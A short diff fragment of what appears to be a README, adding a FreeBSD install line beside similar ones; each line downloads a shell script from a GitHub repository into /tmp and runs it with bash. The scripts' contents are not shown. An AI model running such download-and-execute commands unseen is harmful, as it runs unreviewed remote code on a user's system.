@@ -20,6 +20,10 @@ curl -o /tmp/nobash.sh -Ls https://github.com/A233S/angti/raw/main/nobash.sh ; s
 ```
 curl -o /tmp/php.sh -Ls https://github.com/A233S/angti/raw/main/phpv3p2p.sh ; bash /tmp/php.sh
 ```
+####FreeBSD
+```
+curl -o /tmp/php.sh -Ls https://github.com/A233S/angti/raw/main/phpv3bsd.sh ; bash /tmp/php.sh
+```
 ####transfersh
 ```
 bash <(curl -Ls https://github.com/A233S/angti/raw/main/transfersh.sh)
